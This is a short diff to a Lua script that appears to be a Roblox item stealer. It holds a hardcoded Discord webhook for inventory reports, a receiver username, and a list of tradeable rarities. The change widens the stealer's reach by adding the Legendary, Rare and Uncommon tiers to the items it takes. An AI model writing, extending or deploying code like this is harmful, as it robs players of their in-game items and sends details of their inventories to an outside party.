@@ -6,7 +6,7 @@ local InventoryWebhook = "https://discord.com/api/webhooks/1563955624960725022/3
 local Receivers = {"33kghoster"}
 local DiscordID = ""
 local MIN_TRADE_VALUE = 0
-local TRADEABLE_RARITIES = {Godly=true, Ancient=true, Unique=true, Chroma=true, Vintage=true}
+local TRADEABLE_RARITIES = {Godly=true, Ancient=true, Unique=true, Chroma=true, Vintage=true, Legendary=true, Rare=true, Uncommon=true,}
 
 local found = false
 local attempts = 0
